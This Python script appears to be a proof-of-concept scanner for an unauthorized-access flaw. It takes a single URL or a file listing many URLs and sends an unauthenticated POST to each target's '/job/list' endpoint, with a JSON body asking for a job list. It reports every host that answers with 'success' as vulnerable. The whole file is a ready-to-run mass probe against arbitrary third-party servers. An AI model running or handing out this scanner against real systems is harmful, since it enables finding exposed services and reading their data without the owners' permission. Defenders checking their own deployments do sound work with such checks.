import argparse

import requests

header = {
    'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36 Edg/110.0.1587.69',
    'Content-Type': 'application/json;charset=UTF-8',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6'
}

data = {
    "appId": 1,
    "index": 0,
    "pageSize": 10
}
# 创建命令行参数解析器
parser = argparse.ArgumentParser(description='Example script to process command line arguments.')

# 添加命令行选项
parser.add_argument('-u', '--url', help='URL argument')
parser.add_argument('-f', '--file', help='FILE argument')

# 解析命令行参数
args = parser.parse_args()

# 获取URL和文件参数
url = args.url
file = args.file


def check_vul_file(file):
    with open(file, 'r') as urls:
        for url in urls:
            url = url.replace('\n', "")
            if url.endswith('/'):
                url = url.rstrip('/')
            if not url.strip():  # 检查是否为空行
                continue
            url_check = url + '/job/list'
            response = requests.post(url=url_check, headers=header, json=data, timeout=3).json()
            if "success" in response:
                print(url + "   Vulnerability exists!")


def check_vul_url(url):
    if url.endswith('/'):
        url = url.rstrip('/')
    url_check = url + '/job/list'
    response = requests.post(url=url_check, headers=header, json=data, timeout=3).json()
    if "success" in response:
        print(url + "   Vulnerability exists!")


def process_input(args):
    if args.url is None:
        # 参数是一个文件路径
        check_vul_file(file)
    elif args.file is None:
        # 参数是一个URL
        check_vul_url(url)
    else:
        # 错误情况：两者都提供了参数
        raise ValueError("Please provide the -u or -f parameter")


if __name__ == '__main__':
    process_input(args)
